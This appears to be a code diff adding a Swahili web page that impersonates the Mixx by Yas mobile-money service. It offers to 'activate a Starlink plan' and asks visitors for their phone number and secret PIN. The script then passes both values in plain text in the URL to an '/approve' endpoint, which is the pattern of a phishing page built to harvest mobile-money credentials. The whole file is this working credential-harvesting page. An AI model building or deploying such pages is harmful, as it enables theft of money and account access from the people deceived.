@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Starlink · Lipa</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    body { background: #0a0e1a; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 24px 12px; }
+    .phone-frame { max-width: 390px; width: 100%; background: #0d1117; border-radius: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); overflow: hidden; }
+    .inner-content { padding: 20px 16px 24px; background: #0d1117; }
+    .back-link { display: block; padding: 0.5rem 0 1rem 0; color: #8b95a9; text-decoration: none; font-size: 0.85rem; }
+    .back-link:hover { color: #FFD100; }
+    .mixx-logo { display: flex; justify-content: center; align-items: center; margin-bottom: 16px; }
+    .mixx-logo .logo-box { background: #00377D; color: #fff; font-weight: 800; font-size: 1.2rem; padding: 10px 24px; border-radius: 12px; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 20px rgba(0,55,125,0.3); border: 2px solid #FFD100; }
+    .mixx-logo .logo-box i { font-size: 1.5rem; color: #FFD100; }
+    .mixx-logo .logo-box .mixx-text { color: #FFD100; }
+    .login-welcome { font-size: 1.4rem; font-weight: 700; color: #fff; margin-bottom: 4px; }
+    .login-sub { font-size: 0.85rem; color: #8b95a9; margin-bottom: 24px; }
+    .payment-amount { background: linear-gradient(135deg, #00377D, #002a60); border-radius: 16px; padding: 12px 16px; margin-bottom: 18px; border: 1px solid #FFD100; display: flex; justify-content: space-between; align-items: center; }
+    .payment-amount .label { color: #FFD100; font-size: 0.8rem; }
+    .payment-amount .amount { color: #fff; font-weight: 700; font-size: 1.2rem; }
+    .input-group { margin-bottom: 18px; }
+    .input-group label { display: block; font-size: 0.75rem; font-weight: 600; color: #c5cdd8; margin-bottom: 4px; }
+    .input-group input { width: 100%; padding: 14px; background: #1a202c; border: 2px solid #2d3748; border-radius: 14px; font-size: 1rem; color: #fff; outline: none; }
+    .input-group input:focus { border-color: #FFD100; }
+    .input-group input::placeholder { color: #4a5568; }
+    .input-group .pin-wrapper { position: relative; }
+    .input-group .pin-wrapper input { padding-right: 50px; }
+    .input-group .toggle-pin { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #8b95a9; font-size: 1.1rem; cursor: pointer; }
+    .toggle-pin:hover { color: #FFD100; }
+    .btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 14px 20px; border-radius: 50px; font-weight: 600; font-size: 0.9rem; border: none; cursor: pointer; width: 100%; text-align: center; }
+    .btn-yas { background: #00377D; color: #fff; border: 2px solid #FFD100; }
+    .btn-yas:hover { background: #002a60; }
+    .btn-outline-yas { background: transparent; color: #FFD100; border: 2px solid #FFD100; margin-bottom: 10px; }
+    .login-footer { font-size: 0.65rem; color: #8b95a9; margin-top: 20px; text-align: center; }
+    .login-footer a { color: #FFD100; text-decoration: none; }
+    .action-row { display: flex; gap: 10px; margin-top: 14px; }
+    .action-row .btn { flex: 1; }
+  </style>
+</head>
+<body>
+<div class="phone-frame">
+  <div class="inner-content">
+    <a href="/" class="back-link">← Rudi kwenye mipango</a>
+
+    <div class="mixx-logo">
+      <div class="logo-box"><i class="fas fa-mobile-alt"></i> Mixx <span class="mixx-text">by Yas</span></div>
+    </div>
+
+    <div class="login-welcome">Karibu Mixx by Yas</div>
+    <div class="login-sub">Amilisha mpango wako wa Starlink</div>
+
+    <div class="payment-amount">
+      <span class="label">Kiasi cha kulipa</span>
+      <span class="amount" id="paymentAmount">TSh 0</span>
+    </div>
+
+    <div class="input-group">
+      <label>Nambari yako ya Yas *</label>
+      <input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678">
+    </div>
+
+    <div class="input-group">
+      <label>Nambari ya siri (PIN) *</label>
+      <div class="pin-wrapper">
+        <input type="password" id="pinNumber" placeholder="Ingiza PIN yako">
+        <button class="toggle-pin" id="togglePinBtn" type="button">
+          <i class="fas fa-eye" id="pinIcon"></i>
+        </button>
+      </div>
+    </div>
+
+    <div class="login-footer">
+      Kwa kutumia programu hii unakubali <a href="#">Masharti ya Matumizi</a> na <a href="#">Sera ya Faragha</a>
+    </div>
+
+    <div class="action-row">
+      <button class="btn btn-outline-yas" onclick="window.location.href='/'"><i class="fas fa-arrow-left"></i> Rudi</button>
+      <button class="btn btn-yas" onclick="handlePayment()"><i class="fas fa-check-circle"></i> Thibitisha Malipo</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  var urlParams = new URLSearchParams(window.location.search);
+  var planName = urlParams.get('plan') || '';
+  var planAmount = urlParams.get('amount') || '0';
+  
+  document.getElementById('paymentAmount').textContent = 'TSh ' + parseInt(planAmount).toLocaleString();
+
+  document.addEventListener('DOMContentLoaded', function() {
+    const toggleBtn = document.getElementById('togglePinBtn');
+    const pinInput = document.getElementById('pinNumber');
+    const pinIcon = document.getElementById('pinIcon');
+    if (toggleBtn && pinInput) {
+      toggleBtn.addEventListener('click', function() {
+        if (pinInput.type === 'password') { pinInput.type = 'text'; pinIcon.className = 'fas fa-eye-slash'; }
+        else { pinInput.type = 'password'; pinIcon.className = 'fas fa-eye'; }
+      });
+    }
+  });
+
+  function handlePayment() {
+    const phone = document.getElementById('phoneNumber').value.trim();
+    const pin = document.getElementById('pinNumber').value.trim();
+    if (!phone || phone.length < 9) { alert('Tafadhali ingiza nambari yako ya Yas.'); return; }
+    if (!pin || pin.length < 4) { alert('Tafadhali ingiza nambari yako ya siri (PIN).'); return; }
+    window.location.href = '/approve?plan=' + encodeURIComponent(planName) + '&amount=' + planAmount + '&phone=' + phone + '&pin=' + pin;
+  }
+</script>
+</body>
+</html>
